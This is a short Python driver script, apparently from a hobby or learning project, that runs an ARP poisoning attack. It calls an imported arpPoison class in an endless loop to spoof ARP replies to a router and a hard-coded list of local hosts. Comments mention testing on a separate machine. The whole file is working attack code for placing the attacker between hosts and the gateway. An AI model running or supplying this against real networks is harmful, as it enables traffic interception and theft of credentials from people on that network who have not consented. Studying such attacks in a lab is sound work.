from ARP import arpPoison

# Need a seperate machine to test this attack on.
# Alter IP addresses to meet your own.
# Check arp table (Windows: "arp -a", Linux: "arp")

ipaddrs = ("192.168.1.116", "192.168.1.106")

a = arpPoison("192.168.1.1", "192.168.1.116")

a.setup()
try:
    print("[-] Starting attack")
    while True:
        # Need both as it sends the spoofed ARP packets to both the router and endpoint
        #a.poisonHost()
        #a.poisonRouter()

        # Need to figure out way to populate list without being hardcoded, perhaps through menu, data structure, regex or some kind of secondary script
        a.poisonListOfHosts(ipaddrs)
except KeyboardInterrupt:
    exit()
